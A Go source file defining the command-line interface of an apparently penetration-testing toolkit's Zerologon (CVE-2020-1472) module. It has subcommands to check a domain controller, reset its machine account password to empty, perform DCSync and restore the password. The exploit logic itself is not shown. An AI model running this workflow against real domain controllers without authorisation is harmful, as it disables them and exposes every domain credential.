package cmd

import (
	"adpack/modules"

	"github.com/spf13/cobra"
)

var (
	zerologonDCIP, zerologonDCName, zerologonDCHostname, zerologonUser, zerologonPass, zerologonDomain, zerologonHash string
)

var zerologonCmd = &cobra.Command{
	Use:   "zerologon",
	Short: "Zerologon (CVE-2020-1472) exploit — reset DC machine account password",
	Long: `Exploit the Netlogon Elevation of Privilege vulnerability (CVE-2020-1472).

WARNING: This exploit resets the DC machine account password to an empty string.
The DC will be non-functional until the password is restored.

Workflow:
  1. zerologon check    — test if DC is vulnerable
  2. zerologon exploit  — reset machine account password (DANGEROUS)
  3. zerologon dcsync   — DCSync after successful exploit
  4. zerologon restore  — restore original machine account password`,
}

var zerologonCheckCmd = &cobra.Command{
	Use:   "check",
	Short: "Check if a DC is vulnerable to Zerologon",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.ZerologonManager{}).Check(zerologonDCIP)
	},
}

var zerologonExploitCmd = &cobra.Command{
	Use:   "exploit",
	Short: "Exploit Zerologon — reset DC machine account password to empty",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.ZerologonManager{}).Exploit(zerologonDCIP, zerologonDCName, zerologonDCHostname)
	},
}

var zerologonDCSyncCmd = &cobra.Command{
	Use:   "dcsync",
	Short: "DCSync after successful Zerologon exploit",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.ZerologonManager{}).DCSyncAfterZerologon(zerologonDCIP, zerologonDCName)
	},
}

var zerologonRestoreCmd = &cobra.Command{
	Use:   "restore",
	Short: "Restore DC machine account password from original hash",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.ZerologonManager{}).Restore(zerologonDCIP, zerologonDCName, zerologonHash)
	},
}

func init() {
	flags := zerologonCmd.PersistentFlags()
	flags.StringVar(&zerologonDCIP, "dc-ip", "", "Domain controller IP")
	flags.StringVar(&zerologonDCName, "dc-name", "", "DC NetBIOS name (e.g., DC01)")
	flags.StringVar(&zerologonDCHostname, "dc-hostname", "", "DC hostname (e.g., dc01.domain.local)")
	flags.StringVar(&zerologonUser, "user", "", "Username for pre-exploit hash capture")
	flags.StringVar(&zerologonPass, "password", "", "Password")
	flags.StringVar(&zerologonDomain, "domain", "", "Domain")
	flags.StringVar(&zerologonHash, "hash", "", "Original NT hash for restore")

	zerologonCmd.AddCommand(zerologonCheckCmd, zerologonExploitCmd, zerologonDCSyncCmd, zerologonRestoreCmd)
	rootCmd.AddCommand(zerologonCmd)
}
